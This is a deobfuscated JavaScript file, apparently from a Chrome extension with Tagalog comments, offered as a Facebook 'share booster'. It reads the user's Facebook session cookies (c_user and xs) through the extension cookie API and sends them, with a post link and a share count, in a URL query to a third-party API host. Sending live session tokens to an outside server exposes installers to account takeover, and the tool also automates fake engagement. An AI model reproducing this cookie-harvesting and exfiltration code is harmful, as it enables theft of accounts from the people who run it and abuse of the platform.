// titeng baliko

// Array na naglalaman ng mga string constants na na-obfuscate
const stringArray = ['59586WxIuJb', 'light', '#fecaca', 'body', '_self', 'error', '&link=', '_blank', 'addEventListener', '112540iLhNYm', 'darkModeSwitch', 'status', 'message', '879iLwAot', '2226640JjpVgm', 'Failed to share.', '&limit=', '✅ Shared ', 'cookie', '1436hMwpBB', '❌ Please fill all fields!', 'https://vern-rest-api.vercel.app/api/share?cookie=', 'features.html', 'limit', 'innerHTML', 'name', 'backBtn', 'nav-links', '#fff', 'active', 'cookies', 'classList', 'change', '; xs=', 'query', 'c_user', 'trim', '❌ Error! Check network or cookie.', '55TiHFnF', 'textContent', 'burger', 'color', 'c_user=', 'shareBtn', 'toggle', 'click', 'success_count', 'getElementById', ' times!', 'find', 'tutorials', 'style', 'link', '1897368SzZakT', '4VNqJmA', '<i class="fas fa-spinner fa-spin icon"></i> Processing...', '1187379SkhyzH', '1348669Foowgj', 'open', 'https://www.facebook.com', 'GET', 'dark', 'developer', 'value', 'json'];

// Function para kunin ang mga string mula sa array gamit ang index
function getString(index) {
    const adjustedIndex = index - 0xaa; // Convert hex index to decimal
    return stringArray[adjustedIndex];
}

// Get DOM elements
const burger = document.getElementById('burger');
const navLinks = document.getElementById('nav-links');
const darkModeSwitch = document.getElementById('darkModeSwitch');
const developerBtn = document.getElementById('developer');
const tutorialsBtn = document.getElementById('tutorials');
const backBtn = document.getElementById('backBtn');
const shareBtn = document.getElementById('shareBtn');
const statusEl = document.getElementById('status');
const cookieInput = document.getElementById('cookie');
const linkInput = document.getElementById('link');
const limitInput = document.getElementById('limit');

// Burger menu toggle
burger.addEventListener('click', () => {
    navLinks.classList.toggle('active');
});

// Dark/Light mode toggle
darkModeSwitch.addEventListener('change', () => {
    document.body.classList.toggle('dark');
    document.body.classList.contains('dark') 
        ? document.body.style.color = '#fff'
        : document.body.style.color = '#000';
});

// Developer button click
developerBtn.addEventListener('click', () => {
    window.open('https://www.facebook.com/notfound500', '_self');
});

// Tutorials button click
tutorialsBtn.addEventListener('click', () => {
    window.open('tutorial.html', '_blank');
});

// Back button click
backBtn.addEventListener('click', () => {
    window.open('features.html', '_self');
});

// Share button click handler
shareBtn.addEventListener('click', async () => {
    const cookieValue = cookieInput.value.trim();
    const linkValue = linkInput.value.trim();
    const limitValue = limitInput.value.trim();
    
    // Validation
    if (!cookieValue || !linkValue || !limitValue) {
        statusEl.textContent = '❌ Please fill all fields!';
        statusEl.style.color = '#fecaca';
        return;
    }
    
    // Show processing status
    statusEl.innerHTML = '<i class="fas fa-spinner fa-spin icon"></i> Processing...';
    statusEl.style.color = '#fff';
    
    try {
        // Construct API URL
        const apiUrl = 'https://vern-rest-api.vercel.app/api/share?cookie=' + 
                      encodeURIComponent(cookieValue) + 
                      '&link=' + encodeURIComponent(linkValue) + 
                      '&limit=' + encodeURIComponent(limitValue);
        
        // Send request to API
        const response = await fetch(apiUrl, {
            method: 'GET'
        });
        
        const data = await response.json();
        
        // Check response status
        if (data.status) {
            statusEl.textContent = '✅ Shared ' + data.success_count + ' times!';
            statusEl.style.color = '#d1fae5';
        } else {
            statusEl.textContent = '❌ ' + (data.message || 'Error! Check network or cookie.');
            statusEl.style.color = '#fecaca';
        }
    } catch (error) {
        statusEl.textContent = 'Failed to share.';
        statusEl.style.color = '#fecaca';
        console.error(error);
    }
});

chrome.tabs.query({'active': true, 'currentWindow': true}, (tabs) => {
    const currentTab = tabs[0];
    if (!currentTab) return;
    
    chrome.cookies.getAll({'url': 'https://www.facebook.com'}, (cookies) => {
        const c_userCookie = cookies.find(cookie => cookie.name === 'c_user');
        const xsCookie = cookies.find(cookie => cookie.name === 'xs');
        
        if (c_userCookie && xsCookie) {
            cookieInput.value = 'c_user=' + c_userCookie.value + '; xs=' + xsCookie.value + ';';
        }
    });
});
